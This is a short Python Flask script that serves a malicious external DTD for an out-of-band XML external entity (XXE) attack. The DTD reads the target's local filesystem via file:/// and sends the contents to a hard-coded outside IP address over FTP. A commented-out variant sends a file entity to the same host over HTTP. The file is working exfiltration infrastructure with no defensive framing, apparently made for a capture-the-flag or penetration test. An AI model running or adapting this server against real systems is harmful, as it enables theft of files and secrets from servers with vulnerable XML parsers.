from flask import Flask, Response

app = Flask(__name__)

@app.route('/ex.dtd')
def serve_dtd():
    dtd_content = '''<!ENTITY % data SYSTEM "file:///">
    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://43.201.250.246:8000/%data;'>">%param1;'''

    return Response(dtd_content, content_type='text/xml')
"""OK
    dtd_content = '''
        <!ENTITY % all "<!ENTITY send SYSTEM 'http://43.201.250.246:8000/?d=%file;'>">%all;
        '''
"""

# Flask 서버 실행
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777)